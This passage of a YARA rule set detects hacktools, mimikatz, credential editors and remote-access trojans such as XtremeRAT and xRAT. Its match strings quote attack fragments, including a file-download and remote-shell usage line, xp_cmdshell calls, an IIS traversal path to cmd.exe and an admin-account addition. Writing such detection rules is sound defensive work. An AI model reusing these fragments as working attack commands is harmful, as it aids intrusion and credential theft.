$s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
$s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
$s16 = "Service %s Stopped." fullword ascii
$s20 = "Process Log File %s..." fullword ascii
condition:
5 of them
}
rule SSC_PLUGIN_TracKid {
meta:
description = "Chinese Hacktool Set - file TracKid.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "a114181b334e850d4b33e9be2794f5bb0eb59a09"
strings:
$s0 = "E-mail: cracker_prince@163.com" fullword ascii
$s1 = ".\\TracKid Log\\%s.txt" fullword ascii
$s2 = "Coded by prince" fullword ascii
$s3 = "TracKid.dll" fullword ascii
$s4 = ".\\TracKid Log" fullword ascii
$s5 = "%08x -- %s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 200KB and 3 of them
}
rule SSC_iKAT_wmi_rundll {
meta:
description = "This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe"
author = "Florian Roth"
date = "05.11.14"
score = 65
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
hash = "97c4d4e6a644eed5aa12437805e39213e494d120"
strings:
$s0 = "This operating system is not supported." fullword ascii
$s1 = "Error!" fullword ascii
$s2 = "Win32 only!" fullword ascii
$s3 = "COMCTL32.dll" fullword ascii
$s4 = "[LordPE]" ascii
$s5 = "CRTDLL.dll" fullword ascii
$s6 = "VBScript" fullword ascii
$s7 = "CoUninitialize" fullword ascii
condition:
all of them and filesize < 15KB
}
rule SSC_mimikatz_kirbi_ticket
{
meta:
description		= "KiRBi ticket for mimikatz"
author			= "Benjamin DELPY (gentilkiwi)"
strings:
$asn1			= { 76 82 ?? ?? 30 82 ?? ?? a0 03 02 01 05 a1 03 02 01 16 }
condition:
$asn1 at 0
}
rule SSC_BypassUacDll_7 {
meta:
description = "Auto-generated rule - file BypassUacDll.aps"
author = "yarGen Yara Rule Generator"
hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
strings:
$s3 = "BypassUacDLL.dll" fullword wide
$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
condition:
all of them
}
rule SSC_sig_238_letmein {
meta:
description = "Disclosed hacktool set (old stuff) - file letmein.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
strings:
$s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
$s6 = "Error get users from server!" fullword ascii
$s7 = "get in nt by name and null" fullword ascii
$s16 = "get something from nt, hold by killusa." fullword ascii
condition:
all of them
}
rule SSC_aolipsniffer {
meta:
description = "Auto-generated rule on file aolipsniffer.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "51565754ea43d2d57b712d9f0a3e62b8"
strings:
$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
$s1 = "dwGetAddressForObject"
$s2 = "Color Transfer Settings"
$s3 = "FX Global Lighting Angle"
$s4 = "Version compatibility info"
$s5 = "New Windows Thumbnail"
$s6 = "Layer ID Generator Base"
$s7 = "Color Halftone Settings"
$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"
condition:
all of them
}
rule SSC_Beastdoor_Backdoor {
meta:
description = "Detects the backdoor Beastdoor"
author = "Florian Roth"
score = 55
hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
strings:
$s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
$s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
$s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
$s7 = "Host: wwp.mirabilis.com:80" fullword
$s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
$s11 = "Shell                            -->Get A Shell" fullword
$s14 = "DeleteService ServiceName        -->Delete A Service" fullword
$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
$s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword
condition:
2 of them
}
rule SSC_mswin_check_lm_group {
meta:
description = "Chinese Hacktool Set - file mswin_check_lm_group.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "115d87d7e7a3d08802a9e5fd6cd08e2ec633c367"
strings:
$s1 = "Valid_Global_Groups: checking group membership of '%s\\%s'." fullword ascii
$s2 = "Usage: %s [-D domain][-G][-P][-c][-d][-h]" fullword ascii
$s3 = "-D    default user Domain" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 380KB and all of them
}
rule SSC_WMI_vbs : APT
{
meta:
description = "WMI Tool - APT"
author = "Florian Roth"
release_date = "2013-11-29"
confidential = false
score = 70
strings:
$s3 = "WScript.Echo \"   $$\\      $$\\ $$\\      $$\\ $$$$$$\\ $$$$$$$$\\ $$\\   $$\\ $$$$$$$$\\  $$$$$$"
condition:
all of them
}
rule SSC_CN_Toolset_sig_1433_135_sqlr {
meta:
description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
author = "Florian Roth"
reference = "http://qiannao.com/ls/905300366/33834c0c/"
reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
date = "2015/03/30"
score = 70
hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
strings:
$s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
$s11 = ";DATABASE=master" fullword ascii
$s12 = "xp_cmdshell '" fullword ascii
$s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
condition:
all of them
}
rule SSC_CN_Tools_pc {
meta:
description = "Chinese Hacktool Set - file pc.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "5cf8caba170ec461c44394f4058669d225a94285"
strings:
$s0 = "\\svchost.exe" fullword ascii
$s2 = "%s%08x.001" fullword ascii
$s3 = "Qy001Service" fullword ascii
$s4 = "/.MIKY" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_portscan {
meta:
description = "Auto-generated rule on file portscan.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "a8bfdb2a925e89a281956b1e3bb32348"
strings:
$s5 = "0    :SCAN BEGUN ON PORT:"
$s6 = "0    :PORTSCAN READY."
condition:
all of them
}
rule SSC_Ms_Viru_v {
meta:
description = "Chinese Hacktool Set - file v.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "ecf4ba6d1344f2f3114d52859addee8b0770ed0d"
strings:
$s1 = "c:\\windows\\system32\\command.com /c " fullword ascii
$s2 = "Easy Usage Version -- Edited By: racle@tian6.com" fullword ascii
$s3 = "OH,Sry.Too long command." fullword ascii
$s4 = "Success! Commander." fullword ascii
$s5 = "Hey,how can racle work without ur command ?" fullword ascii
$s6 = "The exploit thread was unable to map the virtual 8086 address space" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 3 of them
}
rule SSC_CN_Tools_MyUPnP {
meta:
description = "Chinese Hacktool Set - file MyUPnP.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "15b6fca7e42cd2800ba82c739552e7ffee967000"
strings:
$s1 = "<description>BYTELINKER.COM</description>" fullword ascii
$s2 = "myupnp.exe" fullword ascii
$s3 = "LOADER ERROR" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1500KB and all of them
}
rule SSC_Mimikatz_Memory_Rule_2 : APT {
meta:
description = "Mimikatz Rule generated from a memory dump"
author = "Florian Roth - Florian Roth"
type = "memory"
score = 80
strings:
$s0 = "sekurlsa::" ascii
$x1 = "cryptprimitives.pdb" ascii
$x2 = "Now is t1O" ascii fullword
$x4 = "ALICE123" ascii
$x5 = "BOBBY456" ascii
condition:
$s0 and 1 of ($x*)
}
rule SSC_AppInitHook {
meta:
description = "AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll"
author = "Florian Roth"
reference = "https://goo.gl/Z292v6"
date = "2015-07-15"
score = 70
hash = "e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45"
strings:
$s0 = "\\Release\\AppInitHook.pdb" ascii
$s1 = "AppInitHook.dll" fullword ascii
$s2 = "mimikatz.exe" fullword wide
$s3 = "]X86Instruction->OperandSize >= Operand->Length" fullword wide
$s4 = "mhook\\disasm-lib\\disasm.c" fullword wide
$s5 = "mhook\\disasm-lib\\disasm_x86.c" fullword wide
$s6 = "VoidFunc" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}
rule SSC_SQLTools {
meta:
description = "Chinese Hacktool Set - file SQLTools.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "38a9caa2079afa2c8d7327e7762f7ed9a69056f7"
strings:
$s1 = "DBN_POST" fullword wide
$s2 = "LOADER ERROR" fullword ascii
$s3 = "www.1285.net" fullword wide
$s4 = "TUPFILEFORM" fullword wide
$s5 = "DBN_DELETE" fullword wide
$s6 = "DBINSERT" fullword wide
$s7 = "Copyright (C) Kibosoft Corp. 2001-2006" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 2350KB and all of them
}
rule SSC_hscan_gui {
meta:
description = "Chinese Hacktool Set - file hscan-gui.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "1885f0b7be87f51c304b39bc04b9423539825c69"
strings:
$s0 = "Hscan.EXE" fullword wide
$s1 = "RestTool.EXE" fullword ascii
$s3 = "Hscan Application " fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 550KB and all of them
}
rule SSC_x_way2_5_sqlcmd {
meta:
description = "Chinese Hacktool Set - file sqlcmd.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "5152a57e3638418b0d97a42db1c0fc2f893a2794"
strings:
$s1 = "LOADER ERROR" fullword ascii
$s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
$s3 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
$s4 = "kernel32.dll" fullword ascii
$s5 = "VirtualAlloc" fullword ascii
$s6 = "VirtualFree" fullword ascii
$s7 = "VirtualProtect" fullword ascii
$s8 = "ExitProcess" fullword ascii
$s9 = "user32.dll" fullword ascii
$s16 = "MessageBoxA" fullword ascii
$s10 = "wsprintfA" fullword ascii
$s11 = "kernel32.dll" fullword ascii
$s12 = "GetProcAddress" fullword ascii
$s13 = "GetModuleHandleA" fullword ascii
$s14 = "LoadLibraryA" fullword ascii
$s15 = "odbc32.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them
}
rule SSC_tools_NTCmd {
meta:
description = "Chinese Hacktool Set - file NTCmd.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "a3ae8659b9a673aa346a60844208b371f7c05e3c"
strings:
$s1 = "pipecmd \\\\%s -U:%s -P:\"\" %s" fullword ascii
$s2 = "[Usage]:  %s <HostName|IP> <Username> <Password>" fullword ascii
$s3 = "pipecmd \\\\%s -U:%s -P:%s %s" fullword ascii
$s4 = "============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============" fullword ascii /* PEStudio Blacklist: os */
$s5 = "=======================NTcmd v0.11 for HScan v1.20=======================" fullword ascii
$s6 = "NTcmd>" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 80KB and 2 of them
}
rule SSC_datPcShare {
meta:
description = "Chinese Hacktool Set - file datPcShare.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "87acb649ab0d33c62e27ea83241caa43144fc1c4"
strings:
$s1 = "PcShare.EXE" fullword wide
$s2 = "MZKERNEL32.DLL" fullword ascii
$s3 = "PcShare" fullword wide
$s4 = "QQ:4564405" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 500KB and all of them
}
rule SSC_WAF_Bypass {
meta:
description = "Chinese Hacktool Set - file WAF-Bypass.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "860a9d7aac2ce3a40ac54a4a0bd442c6b945fa4e"
strings:
$s1 = "Email: blacksplitn@gmail.com" fullword wide
$s2 = "User-Agent:" fullword wide
$s3 = "Send Failed.in RemoteThread" fullword ascii
$s4 = "www.example.com" fullword wide
$s5 = "Get Domain:%s IP Failed." fullword ascii
$s6 = "Connect To Server Failed." fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 7992KB and 5 of them
}
rule SSC_ASPack_ASPACK {
meta:
description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
strings:
$s0 = "ASPACK.EXE" fullword wide
$s5 = "CLOSEDFOLDER" fullword wide
$s10 = "ASPack compressor" fullword wide
condition:
all of them
}
rule SSC_LinuxHacktool_eyes_pscan2 {
meta:
description = "Linux hack tools - file pscan2"
author = "Florian Roth"
reference = "not set"
date = "2015/01/19"
hash = "56b476cba702a4423a2d805a412cae8ef4330905"
strings:
$s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
$s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
$s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
$s8 = "Invalid IP." fullword ascii
$s9 = "# scanning: " fullword ascii
$s10 = "Unable to allocate socket." fullword ascii
condition:
2 of them
}
rule SSC_Hacktools_CN_Panda_tasksvr {
meta:
description = "Disclosed hacktool set - file tasksvr.exe"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
strings:
$s2 = "Consys21.dll" fullword ascii
$s4 = "360EntCall.exe" fullword wide
$s15 = "Beijing1" fullword ascii
condition:
all of them
}
rule SSC_x_way2_5_X_way {
meta:
description = "Chinese Hacktool Set - file X-way.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "8ba8530fbda3e8342e8d4feabbf98c66a322dac6"
strings:
$s0 = "TTFTPSERVERFRM" fullword wide
$s1 = "TPORTSCANSETFRM" fullword wide
$s2 = "TIISSHELLFRM" fullword wide
$s3 = "TADVSCANSETFRM" fullword wide
$s4 = "ntwdblib.dll" fullword ascii
$s5 = "TSNIFFERFRM" fullword wide
$s6 = "TCRACKSETFRM" fullword wide
$s7 = "TCRACKFRM" fullword wide
$s8 = "dbnextrow" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them
}
rule SSC_Dos_netstat {
meta:
description = "Chinese Hacktool Set - file netstat.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "d0444b7bd936b5fc490b865a604e97c22d97e598"
strings:
$s0 = "w03a2409.dll" fullword ascii
$s1 = "Retransmission Timeout Algorithm    = unknown (%1!u!)" fullword wide  /* Goodware String - occured 2 times */
$s2 = "Administrative Status  = %1!u!" fullword wide  /* Goodware String - occured 2 times */
$s3 = "Packet Too Big            %1!-10u!  %2!-10u!" fullword wide  /* Goodware String - occured 2 times */
condition:
uint16(0) == 0x5a4d and filesize < 150KB and all of them
}
rule SSC_PLUGIN_AJunk {
meta:
description = "Chinese Hacktool Set - file AJunk.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "eb430fcfe6d13b14ff6baa4b3f59817c0facec00"
strings:
$s1 = "AJunk.dll" fullword ascii
$s2 = "AJunk.DLL" fullword wide
$s3 = "AJunk Dynamic Link Library" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 560KB and all of them
}
rule SSC_kelloworld_2 {
meta:
description = "Chinese Hacktool Set - file kelloworld.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
strings:
$s1 = "Hello World!" fullword wide
$s2 = "kelloworld.dll" fullword ascii
$s3 = "kelloworld de mimikatz pour Windows" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 200KB and all of them
}
rule SSC_Dos_GetPass {
meta:
description = "Chinese Hacktool Set - file GetPass.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "d18d952b24110b83abd17e042f9deee679de6a1a"
strings:
$s0 = "GetLogonS" ascii
$s3 = "/showthread.php?t=156643" ascii
$s8 = "To Run As Administ" ascii
$s18 = "EnableDebugPrivileg" fullword ascii
$s19 = "sedebugnameValue" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 890KB and all of them
}
rule SSC_Ms_Viru_racle {
meta:
description = "Chinese Hacktool Set - file racle.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "13116078fff5c87b56179c5438f008caf6c98ecb"
strings:
$s0 = "PsInitialSystemProcess @%p" fullword ascii
$s1 = "PsLookupProcessByProcessId(%u) Failed" fullword ascii
$s2 = "PsLookupProcessByProcessId(%u) => %p" fullword ascii
$s3 = "FirstStage() Loaded, CurrentThread @%p Stack %p - %p" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 210KB and all of them
}
rule SSC_Tools_unknown {
meta:
description = "Chinese Hacktool Set - file unknown.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "4be8270c4faa1827177e2310a00af2d5bcd2a59f"
strings:
$s1 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
$s2 = "GET /ok.asp?id=1__sql__ HTTP/1.1" fullword ascii
$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
$s4 = "Failed to clear tab control Failed to delete tab at index %d\"Failed to retrieve" wide
$s5 = "Host: 127.0.0.1" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them
}
rule SSC_cgis4_cgis4 {
meta:
description = "Auto-generated rule on file cgis4.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "d658dad1cd759d7f7d67da010e47ca23"
strings:
$s0 = ")PuMB_syJ"
$s1 = "&,fARW>yR"
$s2 = "m3hm3t_rullaz"
$s3 = "7Projectc1"
$s4 = "Ten-GGl\""
$s5 = "/Moziqlxa"
condition:
all of them
}
rule SSC_GoodToolset_ms11046 {
meta:
description = "Chinese Hacktool Set - file ms11046.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "f8414a374011fd239a6c6d9c6ca5851cd8936409"
strings:
$s1 = "[*] Token system command" fullword ascii
$s2 = "[*] command add user 90sec 90sec" fullword ascii
$s3 = "[*] Add to Administrators success" fullword ascii
$s4 = "[*] User has been successfully added" fullword ascii
$s5 = "Program: %s%s%s%s%s%s%s%s%s%s%s" fullword ascii  /* Goodware String - occured 3 times */
condition:
uint16(0) == 0x5a4d and filesize < 840KB and 2 of them
}
rule SSC_sig_238_sqlcmd {
meta:
description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
author = "Florian Roth"
date = "23.11.14"
score = 40
hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
strings:
$s0 = "Permission denial to EXEC command.:(" fullword ascii
$s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
$s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
$s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
$s6 = "SqlCmd2.exe Inside Edition." fullword ascii
$s7 = "Http://www.patching.net  2000/12/14" fullword ascii
$s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
condition:
4 of them
}
rule SSC_epathobj_exp64 {
meta:
description = "Chinese Hacktool Set - file epathobj_exp64.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "09195ba4e25ccce35c188657957c0f2c6a61d083"
strings:
$s1 = "Watchdog thread %d waiting on Mutex" fullword ascii
$s2 = "Exploit ok run command" fullword ascii
$s3 = "\\epathobj_exp\\x64\\Release\\epathobj_exp.pdb" fullword ascii
$s4 = "Alllocated userspace PATHRECORD () %p" fullword ascii
$s5 = "Mutex object did not timeout, list not patched" fullword ascii
$s6 = "- inconsistent onexit begin-end variables" fullword wide  /* Goodware String - occured 96 times */
condition:
uint16(0) == 0x5a4d and filesize < 150KB and 2 of them
}
rule SSC_aspbackdoor_asp4 {
meta:
description = "Disclosed hacktool set (old stuff) - file asp4.txt"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "faf991664fd82a8755feb65334e5130f791baa8c"
strings:
$s0 = "system.dll" fullword ascii
$s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
$s3 = "Public Function reboot(atype As Variant)" fullword ascii
$s4 = "t& = ExitWindowsEx(1, atype)" ascii
$s5 = "atype=request(\"atype\") " fullword ascii
$s7 = "AceiveX dll" fullword ascii
$s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
$s10 = "sys.reboot(atype)" fullword ascii
condition:
all of them
}
rule SSC_Hacktools_CN_Burst_Blast {
meta:
description = "Disclosed hacktool set - file Blast.bat"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "b07702a381fa2eaee40b96ae2443918209674051"
strings:
$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
$s1 = "@echo off" fullword ascii
condition:
all of them
}
rule SSC_sig_238_findoor {
meta:
description = "Disclosed hacktool set (old stuff) - file findoor.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
strings:
$s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
$s8 = "PASS hacker@hacker.com" fullword ascii
$s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
$s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
$s11 = "http://isno.yeah.net" fullword ascii
condition:
4 of them
}
rule SSC_Dos_lcx {
meta:
description = "Chinese Hacktool Set - file lcx.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "b6ad5dd13592160d9f052bb47b0d6a87b80a406d"
strings:
$s0 = "c:\\Users\\careful_snow\\" ascii
$s1 = "Desktop\\Htran\\Release\\Htran.pdb" ascii
$s3 = "[SERVER]connection to %s:%d error" fullword ascii
$s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
$s6 = "=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] " ascii
$s7 = "[-] There is a error...Create a new connection." fullword ascii
$s8 = "[+] Accept a Client on port %d from %s" fullword ascii
$s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
$s13 = "[+] Make a Connection to %s:%d...." fullword ascii
$s16 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
$s17 = "[+] Waiting another Client on port:%d...." fullword ascii
$s18 = "[+] Accept a Client on port %d from %s ......" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}
rule SSC_Dos_iis7 {
meta:
description = "Chinese Hacktool Set - file iis7.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "0a173c5ece2fd4ac8ecf9510e48e95f43ab68978"
strings:
$s0 = "\\\\localhost" fullword ascii
$s1 = "iis.run" fullword ascii
$s3 = ">Could not connecto %s" fullword ascii
$s5 = "WHOAMI" ascii
$s13 = "WinSta0\\Default" fullword ascii  /* Goodware String - occured 22 times */
condition:
uint16(0) == 0x5a4d and filesize < 140KB and all of them
}
rule SSC_PassSniffer {
meta:
description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
strings:
$s2 = "Sniff" fullword ascii
$s3 = "GetLas" fullword ascii
$s4 = "VersionExA" fullword ascii
$s10 = " Only RuntUZ" fullword ascii
$s12 = "emcpysetprintf\\" fullword ascii
$s13 = "WSFtartup" fullword ascii
condition:
all of them
}
rule SSC_WCE_Modified_1_1014 {
meta:
description = "Modified (packed) version of Windows Credential Editor"
author = "Florian Roth"
hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
score = 70
strings:
$s0 = "LSASS.EXE" fullword ascii
$s1 = "_CREDS" ascii
$s9 = "Using WCE " ascii
condition:
all of them
}
rule SSC_xtreme_rat : Trojan
{
meta:
author="Kevin Falcoz"
date="23/02/2013"
description="Xtreme RAT"
strings:
$signature1={58 00 54 00 52 00 45 00 4D 00 45} /*X.T.R.E.M.E*/
condition:
$signature1
}
rule SSC_xtreme_rat_1
{
meta:
maltype = "Xtreme RAT"
ref = "https://github.com/reed1713"
reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/"
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="5156"
$data="windows\\system32\\sethc.exe"
$type1="Microsoft-Windows-Security-Auditing"
$eventid1="4688"
$data1="AppData\\Local\\Temp\\Microsoft Word.exe"
condition:
all of them
}
rule SSC_xtreme_rat_0
{
meta:
maltype = "Xtreme RAT"
reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/"
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="5156"
$data="windows\\system32\\sethc.exe"
$type1="Microsoft-Windows-Security-Auditing"
$eventid1="4688"
$data1="AppData\\Local\\Temp\\Microsoft Word.exe"
condition:
all of them
}
rule SSC_XtremeRATStrings : XtremeRAT Family
{
meta:
description = "XtremeRAT Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-07-09"
strings:
$ = "dqsaazere"
$ = "-GCCLIBCYGMING-EH-TDM1-SJLJ-GTHR-MINGW32"
condition:
any of them
}
rule SSC_Xtreme
{
meta:
description = "Xtreme RAT"
author = "botherder https://github.com/botherder"
strings:
$string1 = /(X)tremeKeylogger/ wide ascii
$string2 = /(X)tremeRAT/ wide ascii
$string3 = /(X)TREMEUPDATE/ wide ascii
$string4 = /(S)TUBXTREMEINJECTED/ wide ascii
$unit1 = /(U)nitConfigs/ wide ascii
$unit2 = /(U)nitGetServer/ wide ascii
$unit3 = /(U)nitKeylogger/ wide ascii
$unit4 = /(U)nitCryptString/ wide ascii
$unit5 = /(U)nitInstallServer/ wide ascii
$unit6 = /(U)nitInjectServer/ wide ascii
$unit7 = /(U)nitBinder/ wide ascii
$unit8 = /(U)nitInjectProcess/ wide ascii
condition:
5 of them
}
rule SSC_XtremeRATCode : XtremeRAT Family
{
meta:
description = "XtremeRAT code features"
author = "Seth Hardy"
last_modified = "2014-07-09"
strings:
// call; fstp st
$ = { E8 ?? ?? ?? ?? DD D8 }
// hiding string
$ = { C6 85 ?? ?? ?? ?? 4D C6 85 ?? ?? ?? ?? 70 C6 85 ?? ?? ?? ?? 64 C6 85 ?? ?? ?? ?? 62 C6 85 ?? ?? ?? ?? 6D }
condition:
all of them
}
rule SSC_xtremrat : rat
{
meta:
author = "Jean-Philippe Teissier / @Jipe_"
description = "Xtrem RAT v3.5"
date = "2012-07-12"
version = "1.0"
filetype = "memory"
strings:
$a = "XTREME" wide
$b = "XTREMEBINDER" wide
$c = "STARTSERVERBUFFER" wide
$d = "SOFTWARE\\XtremeRAT" wide
$e = "XTREMEUPDATE" wide
$f = "XtremeKeylogger" wide
$g = "myversion|3.5" wide
$h = "xtreme rat" wide nocase
condition:
2 of them
}
rule SSC_xRAT20 : RAT
{
meta:
author = "Rottweiler"
date = "2015-08-20"
description = "Identifies xRAT 2.0 samples"
maltype = "Remote Access Trojan"
hash0 = "cda610f9cba6b6242ebce9f31faf5d9c"
hash1 = "60d7b0d2dfe937ac6478807aa7043525"
hash2 = "d1b577fbfd25cc5b873b202cfe61b5b8"
hash3 = "1820fa722906569e3f209d1dab3d1360"
hash4 = "8993b85f5c138b0afacc3ff04a2d7871"
hash5 = "0c231ed8a800b0f17f897241f1d5f4e3"
hash1 = "60d7b0d2dfe937ac6478807aa7043525"
hash8 = "2c198e3e0e299a51e5d955bb83c62a5e"
sample_filetype = "exe"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "GetDirectory: File not found" wide
$string1 = "<>m__Finally8"
$string2 = "Secure"
$string3 = "ReverseProxyClient"
$string4 = "DriveDisplayName"
$string5 = "<IsError>k__BackingField"
$string6 = "set_InstallPath"
$string7 = "memcmp"
$string8 = "urlHistory"
$string9 = "set_AllowAutoRedirect"
$string10 = "lpInitData"
$string11 = "reader"
$string12 = "<FromRawDataGlobal>d__f"
$string13 = "mq.png" wide
$string14 = "remove_KeyDown"
$string15 = "ProtectedData"
$string16 = "m_hotkeys"
$string17 = "get_Hour"
$string18 = "\\mozglue.dll" wide
condition:
18 of them
}
rule SSC_xRAT : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/xRat"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$v1a = "DecodeProductKey"
$v1b = "StartHTTPFlood"
$v1c = "CodeKey"
$v1d = "MESSAGEBOX"
$v1e = "GetFilezillaPasswords"
$v1f = "DataIn"
$v1g = "UDPzSockets"
$v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}
$v2a = "<URL>k__BackingField"
$v2b = "<RunHidden>k__BackingField"
$v2c = "DownloadAndExecute"
